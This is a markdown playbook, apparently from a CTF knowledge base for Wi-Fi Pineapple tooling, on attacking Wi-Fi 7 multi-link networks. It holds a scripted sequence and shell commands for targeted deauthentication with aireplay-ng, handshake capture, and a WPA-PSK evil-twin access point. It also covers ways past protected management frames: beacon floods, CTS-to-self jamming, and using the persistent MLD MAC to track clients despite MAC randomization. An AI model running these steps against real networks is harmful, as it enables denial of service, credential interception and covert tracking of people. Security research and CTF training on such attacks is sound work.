# Wi-Fi 7 MLO flag — link-desync between 2.4/5/6 GHz

Multi-Link Operation shares one PTK across links. A per-link desync
(one link suppressed, others up) can surface an inconsistency in the
security context — where 2024–2026 research is publishing primitives.

## Recognition

- **EHT Capabilities IE (ext ID 108)** in beacons.
- **Basic Multi-Link element** in (Re)Association Requests carrying
  the MLD MAC.
- Multiple per-link BSSIDs on the same ESSID.

## The one-shot sequence

```python
run_sequence([
    # 1. Passive multi-band capture.
    {"action": "recon_start", "band": "abg", "dwell_ms": 250},
    {"action": "wait", "s": 20},
    {"action": "recon_stop"},

    # 2. Identify the MLD and the per-link BSSIDs.
    {"action": "list_mld_targets",
     "src_pcap": "/tmp/recon.pcapng",
     "out": "/tmp/mlds.json"},

    # 3. Deauth ONLY on the 2.4 GHz link — the weakest, most reachable.
    {"action": "deauth_targeted",
     "bssid": "<per-link BSSID on 2.4>",
     "client": "<per-link MAC on 2.4>",
     "count": 3},

    # 4. Watch the 5/6 GHz links for decrypt-fail or key-reinstall.
    {"action": "capture_start",
     "iface": "wlan1mon",
     "band": "5",
     "out_path": "/tmp/mlo-5ghz.pcapng"},
    {"action": "wait", "s": 30},
    {"action": "capture_stop"},

    # 5. Fall back — per-link evil twin on 2.4 GHz.
    {"action": "hostapd_up",
     "ssid": "<target ESSID>",
     "channel": 6,
     "wpa": 2,
     "wpa_key_mgmt": "WPA-PSK",
     "wpa_passphrase": "<known or guessed>"},
])
```

## MCP mapping / fallback

None of `list_mld_targets`, `deauth_targeted`, `capture_start`,
`capture_stop`, `hostapd_up` are exposed as MCP tools with those exact
names. The closest mappings are:

- `deauth_targeted` → `server.do_deauth(bssid=..., client_mac=..., count=...)`
  or the `deauth` action in `run_sequence`.
- `capture_start` / `capture_stop` → **no `src/` equivalent** — drive
  `tcpdump`/`hcxdumptool` on the Pineapple over SSH, or use
  `server.do_capture_handshake` for a bounded window.
- `hostapd_up` → `server.do_create_rogue_ap(ssid, channel, security,
  psk, ...)` (WPA-PSK only for now — no WPA-EAP in the current API).
- `list_mld_targets` → parse the pcap; there's no dedicated tool.

**Fallback shell chain — enumerate MLDs and per-link BSSIDs:**

```bash
# EHT Capabilities is Extension-ID 108 (wlan.tag.ext.number == 108).
# Basic Multi-Link element is Extension-ID 107.
tshark -r /tmp/recon.pcapng \
    -Y "wlan.fc.type_subtype == 8 && wlan.ext_tag.number == 108" \
    -T fields -e wlan.bssid -e wlan.ssid -e wlan.ds.current_channel \
  | sort -u

# Association Requests carrying the Basic Multi-Link element:
tshark -r /tmp/recon.pcapng \
    -Y "wlan.fc.type_subtype == 0 && wlan.ext_tag.number == 107" \
    -T fields -e wlan.sa -e wlan.bssid \
    -e wlan.ext_tag.data
```

**Fallback shell chain — per-link deauth (PMF-off only):**

```bash
sudo aireplay-ng -0 3 -a <per-link-BSSID-2.4> \
    -c <per-link-MAC-2.4> wlan1mon
```

## The flag surface

Two candidates:

1. **A decrypt-fail or replayed frame** on the surviving link is the
   flag payload. This is the frontier-research path; specific
   primitives track `wifi7-mlo-link-desync` in attacks.json.
2. **Fallback association** to your per-link evil twin. Wi-Fi 7
   clients still associate as legacy single-link STAs when only one
   band is available.

## Recon detail — MLD MAC vs. link MAC

Even when a client randomizes per-link MACs, the MLD MAC persists in
some frames (Basic Multi-Link element, some action frames). Correlate
sightings across bands via the MLD MAC to identify a client across
seemingly-independent radios.

## Failure modes

- **Client refuses non-MLO fallback.** Some enterprise supplicants
  require MLO on MLO-tagged profiles.
- **All links PMF-required.** Path B (link-desync via deauth) closes.
  Path 5 (per-link evil twin) still works via RSSI.
- **Per-link MAC randomization without MLD leak.** Rare but possible
  in some 2026 patched supplicants.

## What still works when PMF-required

Wi-Fi 7 hardware is basically always PMF-required — 6 GHz mandates
it and the MLD context inherits the strictest link's posture. The
sequence above uses a 2.4 GHz-link deauth (step 3) as the desync
trigger; on a fully PMF-required MLD that step drops out. The
useful desync primitives that remain:

- **Natural per-link outage.** Physical interference on one band
  (a wide 2.4 GHz beacon flood on an adjacent BSSID, mdk4 `b`) or
  a DFS radar event on 5 GHz produces the same per-link desync
  a deauth would — from below the mgmt-frame layer that PMF
  guards.
- **Control-frame silencing.** CTS-to-self NAV reservation on
  one band (see `dos/walkthrough.md` §CTS-to-self) suppresses
  activity on that link without any mgmt frames. PMF doesn't
  cover control frames.
- **Per-link evil-twin on the weakest band.** Step 5 above (the
  fallback per-link twin) still works: single-link Wi-Fi 7
  clients associate to it on RSSI. No deauth needed.
- **MLO handshake capture is not PMF-protected.** The initial
  MLD 4-way + Basic Multi-Link element in (Re)Assoc frames
  captures cleanly as long as you're on-channel when the client
  associates. Wait for a natural reassoc.
- **Per-link key-reinstall research.** The frontier primitives
  in `wifi7-mlo-link-desync` typically exercise a control- or
  data-frame path anyway; the deauth step is a convenience, not
  a requirement.

## Cite

- attacks.json: `wifi7-mlo-link-desync` (confidence: secondary —
  active frontier area), `cts-to-self-silencing`,
  `beacon-flood-mdk4`.
- IEEE Std 802.11be-2024, §35 (MLO); §11.34 (PMF, inherited).
- knowledge/ctf/pmf-required-targets.md.
